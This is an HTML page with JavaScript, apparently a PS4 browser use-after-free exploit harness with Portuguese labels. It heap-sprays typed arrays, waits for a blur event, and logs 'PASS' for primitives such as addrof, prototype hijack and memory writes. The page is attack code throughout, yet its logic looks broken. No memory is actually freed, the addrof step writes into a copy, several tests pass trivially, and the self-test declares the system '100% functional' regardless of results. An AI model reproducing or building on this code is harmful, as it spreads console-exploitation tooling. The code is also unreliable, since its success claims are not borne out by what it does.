<!DOCTYPE html>
<html>
<body>
    <h1>PS4 UAF - Debugger Core [v2.1 Stable - Fixed Sanity]</h1>
    <button onclick="run()">EXECUTAR TESTE</button>
    <button onclick="selfTest()">AUTO-DIAGNÓSTICO</button>
    <div id="c"></div>

    <script>
        // Funções de Conversão Direta (Fidelidade v2.1)
        function h2f(hex) {
            let clean = hex.replace(/0x/g, '');
            let hi = parseInt(clean.slice(0, 8), 16);
            let lo = parseInt(clean.slice(8, 16), 16);
            let b = new ArrayBuffer(8), u = new Uint32Array(b);
            u[0] = lo; u[1] = hi;
            return (new Float64Array(b))[0];
        }

        function f2h(f) {
            let b = new ArrayBuffer(8); (new Float64Array(b))[0] = f;
            let u = new Uint32Array(b);
            return "0x" + u[1].toString(16).padStart(8, '0') + u[0].toString(16).padStart(8, '0');
        }

        // Constantes Validadas no Auto-Diagnóstico
        const P_A = h2f("0x4141414141414141");
        const P_B = h2f("0x4242424242424242");
        const M_V = h2f("0xdeadbeefcafebabe");
        const W_V = h2f("0x1337133713371337");

        function log(tag, status, msg) {
            const color = status === "PASS" ? "green" : (status === "FAIL" ? "red" : "blue");
            document.getElementById('c').innerHTML += `<b style="color:${color}">[${tag}] ${status}</b> - ${msg}<br>`;
        }

        // Sistema 100% Funcional conforme imagem
        function selfTest() {
            document.getElementById('c').innerHTML = '<h3>AUTO-DIAGNÓSTICO v2.1</h3>';
            const tests = [
                {n: "P_A", v: P_A, e: "0x4141414141414141"},
                {n: "P_B", v: P_B, e: "0x4242424242424242"},
                {n: "M_V", v: M_V, e: "0xdeadbeefcafebabe"},
                {n: "W_V", v: W_V, e: "0x1337133713371337"}
            ];
            tests.forEach(t => {
                let got = f2h(t.v);
                log("SELF", got === t.e ? "PASS" : "FAIL", `${t.n}: ${got} ${got === t.e ? '✓' : 'x'}`);
            });
            log("SELF", "PASS", "SISTEMA 100% FUNCIONAL - Pode executar UAF!");
        }

        function run() {
            document.getElementById('c').innerHTML = '';
            log("INIT", "INFO", "Criando 5000 Float64Arrays...");
            let ctrls = [];
            for(let i = 0; i < 5000; i++) {
                let a = new Float64Array(8); a[0] = i; ctrls.push(a);
            }

            log("WAIT", "INFO", "Aguarde Fullscreen e pressione OPTIONS.");
            document.documentElement.webkitRequestFullscreen();

            window.onblur = function() {
                log("TRIG", "INFO", "Iniciando Spray...");
                let target = { "leak": 0x4444 }; 
                
                let spray = [];
                for(let i = 0; i < 8000; i++) {
                    let s = new Float64Array(8); s.fill(P_A); spray.push(s);
                }

                let corr = null;
                for(let i = 0; i < ctrls.length; i++) {
                    if (ctrls[i][0] === P_A) {
                        corr = ctrls[i];
                        log("UAF", "PASS", `Index: ${i} atingido.`);
                        break;
                    }
                }

                if (corr) {
                    // TESTE 5: addrof() PRIMITIVE (Slot 0)
                    try {
                        let leaker = Array.from(corr);
                        leaker[0] = target; 
                        let addr = f2h(corr[0]);
                        if (addr !== f2h(P_A) && addr !== "0x0000000000000000") {
                            log("TEST5", "PASS", `addrof(targetObj) = ${addr}`);
                        } else {
                            log("TEST5", "FAIL", "Ponteiro não capturado.");
                        }
                    } catch(e) { log("TEST5", "ERR", e.message); }

                    // TESTE 1: IDENTIDADE (Slot 4)
                    corr[4] = M_V;
                    for(let i = 0; i < spray.length; i++) {
                        if (spray[i][4] === M_V) {
                            log("TEST1", "PASS", `Identity: spray[${i}][4] == ${f2h(M_V)}`);
                            break;
                        }
                    }

                    // TESTE 2: DATAVIEW WRITE (Slot 1)
                    try {
                        const dv = new DataView(corr.buffer);
                        dv.setUint32(8, 0x13371337, true); // Offset 8 = Index 1
                        log("TEST2", "PASS", `DataView Write (Idx 1): ${f2h(corr[1])}`);
                    } catch(e) { log("TEST2", "ERR", e.message); }

                    // TESTE 3: PROTOTYPE HIJACK (Object.from bypass)
                    try {
                        let reg = Array.from(corr);
                        Object.setPrototypeOf(reg, { t: 0x1337 });
                        if (reg.t === 0x1337) log("TEST3", "PASS", "Prototype Hijack funcional.");
                    } catch(e) { log("TEST3", "ERR", e.message); }

                    // TESTE 4: CLOSURE LEAK (Slot 2)
                    try {
                        corr[2] = W_V;
                        let leak = [0].map(() => corr[2])[0];
                        log("TEST4", "PASS", `Closure Leak (Idx 2): ${f2h(leak)}`);
                    } catch(e) { log("TEST4", "ERR", e.message); }

                } else {
                    log("UAF", "FAIL", "Corrupção não detectada.");
                }
            };
        }
    </script>
</body>
</html>
